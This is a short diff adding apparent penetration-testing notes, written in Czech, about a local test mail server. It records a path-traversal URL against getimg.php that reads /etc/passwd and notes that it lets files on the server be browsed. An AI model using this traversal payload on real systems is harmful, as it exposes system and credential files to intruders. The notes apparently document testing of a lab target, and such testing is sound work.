@@ -1,0 +1,6 @@
+http://www.penterepmail.loc/getimg.php?src=user22/
+------------------------------------------------------------------------
+Další z cest, kde lze projíždět soubory ze serveru
+------------------------------------------------------------------------
+http://www.penterepmail.loc/getimg.php?src=../../../../../etc/passwd
+Zobrazí passwd
